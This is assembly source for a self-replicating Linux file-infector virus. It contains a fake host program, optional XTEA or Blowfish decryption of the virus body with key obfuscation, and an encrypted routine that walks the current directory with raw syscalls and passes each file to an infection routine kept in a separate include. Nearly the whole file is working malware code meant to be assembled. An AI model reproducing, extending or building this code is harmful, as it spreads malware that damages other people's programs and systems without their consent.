; By using this file, you agree to the terms and conditions set
; forth in the COPYING file which can be found at the top level
; of this distribution.
;
		BITS	32
		CPU	586
		global	_start

%include	'features.inc'
%macro movb 2
%if %2 == 0
	xor	%1, %1
%else
	push	byte %2
	pop	%1
%endif
%endmacro
%macro	lalign 2
	%rep %2
		%if (($ - %1) % %2) == 0
			%exitrep
		%endif
		nop
	%endrep
%endmacro
%macro  mpush 1-* 
	%rep  %0 
		push    %1 
		%rotate 1 
	%endrep 
%endmacro
%macro	PROLOGUE	0
%ifdef UEP
		push	byte 0
%endif
		pushf
		pusha
		mov	edx, IBUFFER_SIZE
		sub	esp, edx
		mov	ebx, esp
%endmacro

%define	O(L)		(L - virus_begin)
%define	PAGE_SIZE	4096
%define	DIRENT_SIZE	268
%define	IBUFFER_SIZE	8192
%define	DIRENT_DNAME	10
;------------------------------------------------------------------------------
; Fake host
_start:
%ifdef	UEP
		call	virus_jmp
%else
		jmp	virus_jmp
real_start:	call	subr
%endif
		mov	eax, 1
		mov	ebx, 0
		int	0x80

subr:		mov	eax, 4
		mov	ebx, 1
		lea	ecx, [message]
		mov	edx, msglen
		int	0x80
		ret

message		db	"Host programm continue execution", 0x0a
msglen		equ	$ - message
		align	16
;------------------------------------------------------------------------------
; fake virus prologue (instead of decryption)
virus_jmp:	PROLOGUE
		jmp	virus_start
;==============================================================================
virus_begin:	call	.get
.get:		pop	eax
		sub	eax, O(.get)
		ret
%ifdef	CRYPT
	%ifdef XTEA
		%include	'include/xtea_decipher.asm'
	%elifdef BLOWFISH
		%include	'include/blowfish.asm'
		%include	'mk_key.asm'
	%endif
	%ifdef OBFUSCATE_KEY
		%include	'include/bfi.asm'
	%endif
%endif

entry_point:	PROLOGUE
%ifdef	CRYPT
	%ifdef	OBFUSCATE_KEY
		mov	edi, ebx
		xor	eax, eax
		mov	ecx, edx
		rep	stosb

		call	virus_begin
		lea	esi, [eax + O(virus_start)]
		mov	edi, ebx

		lea	eax, [eax + O(virus_end)]	; code
		mpush	ebx, eax
		call	bf				; bf(code, core, ...)

	%else
		call	virus_begin
		lea	esi, [eax + O(virus_start)]	; cipher text		
		lea	edi, [eax + O(virus_end)]	; key
	%endif
		mov	ecx, ESIZE / BLOCK_LENGTH
	%ifdef		XTEA
	.do:	mpush	edi, esi
		call	XTEA_Decipher			; XTEA_Decipher(buf, key)
		add	esi, BLOCK_LENGTH
		loop	.do
	%elifdef	BLOWFISH
		push	ebx
		lea	ebx, [ebx + KEY_LENGTH]
		lea	eax, [ebx + 72]		
		push	ebx				; P		
		push	eax				; S
		push	edi				; key
		call	blowfish_init			; blowfish_init(key, S, P)

	.do:	push	ebx				; P
		push	eax				; S
		push	esi				; data
		call	blowfish_decipher		; blowfish_decipher(data, S, P)
		add	esi, BLOCK_LENGTH
		loop	.do
		pop	ebx
	%endif
%endif
;------------------------------------------------------------------------------
; encrypted part begins here
virus_start:	mov	word [ebx], 0x2e		; "."
		movb	eax, 5
		movb	ecx, 0				; O_RDONLY
		int	0x80				; open
		or	eax, eax
		js	.all_done

		xchg	eax, ebx

.read_dir:	mov	ecx, esp
		movb	eax, 89
		int	0x80				; readdir
		dec	eax
		jnz	.all_done

		lea	eax, [esp + DIRENT_DNAME]
		lea	ecx, [esp + DIRENT_SIZE]
		mpush	ecx, eax
		call	infect_file
		or	eax, eax
		jnz	.read_dir
		
.all_done:	add	esp, edx
		movb	eax, 6
		int	0x80				; close

.return:
%ifdef	UEP
		mov	eax, [esp + 40]
		lea	eax, [dword eax + (subr - _start - 5)]
calladdr	equ	$ - 4
		mov	[esp + 36], eax
		popa
		popf
		ret
%else
		popa
		popf
		push	strict dword real_start
retaddr		equ	$ - 4
		ret
%endif

%include 	'infect.asm'
%ifdef CRYPT
; we need a round number of blocks for encryption
		lalign	virus_start, BLOCK_LENGTH
%endif
virus_end:
VSIZE		equ	O($)
CSIZE		equ	(virus_start - virus_begin)
ESIZE		equ	(virus_end - virus_start)


%macro	pp 2
	db	10, %1
	%strlen l %1
	%rep (32 - l)
		db ' '
	%endrep
	%assign	i 1000
	%rep 4
		%assign	n %2/i
		%if (n > 0)
			db	(n % 10 + '0')
		%else
			db	' '
		%endif
		%assign i i/10
	%endrep
%endmacro
		pp	'*** VIRUS SIZE IS', VSIZE
		pp	'*** CLEAN PART SIZE IS', CSIZE
		pp	'*** ENCRYPTED PART SIZE IS', ESIZE
;EOF
